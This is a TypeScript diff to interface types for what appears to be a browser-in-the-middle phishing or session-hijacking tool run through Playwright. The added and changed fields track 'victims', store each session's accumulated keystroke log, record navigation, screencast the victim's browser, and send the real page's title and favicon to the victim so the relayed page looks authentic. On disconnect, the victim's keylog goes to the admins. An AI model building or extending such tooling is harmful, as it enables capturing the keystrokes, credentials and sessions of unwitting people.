@@ -113,6 +113,24 @@ export interface BrowserInstance {
   
   /** Accumulated keystroke log for this session (formatted string) */
   keylog: string;
+  
+  /**
+   * Screencast controller for cleanup.
+   * Provides stop() method to cleanly terminate screencast and remove listeners.
+   */
+  screencastController: import('./screencast.js').ScreencastController | null;
+  
+  /**
+   * Navigation logger listener reference for cleanup.
+   * Logs all navigation events to session log file.
+   */
+  navigationLogger: ((frame: import('playwright').Frame) => void) | null;
+  
+  /**
+   * Page metadata emitter listener reference for cleanup.
+   * Emits page title and favicon to victim after navigation.
+   */
+  pageMetaEmitter: ((frame: import('playwright').Frame) => void) | null;
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -194,7 +212,7 @@ export interface ServerToClientEvents {
   new_victim: (data: VictimInfo) => void;
   
   /** Notification of victim disconnection (sent to all admins) */
-  victim_disconnected: (data: { browserId: string }) => void;
+  victim_disconnected: (data: { browserId: string; status: 'disconnected'; keylog: string }) => void;
   
   /** List of currently active victims (sent to admin on connect) */
   victim_list: (data: VictimInfo[]) => void;
@@ -381,6 +399,9 @@ export interface VictimInfo {
   
   /** Accumulated keystroke log */
   keylog: string;
+  
+  /** Connection status: 'active' or 'disconnected' */
+  status: 'active' | 'disconnected';
 }
 
 /**
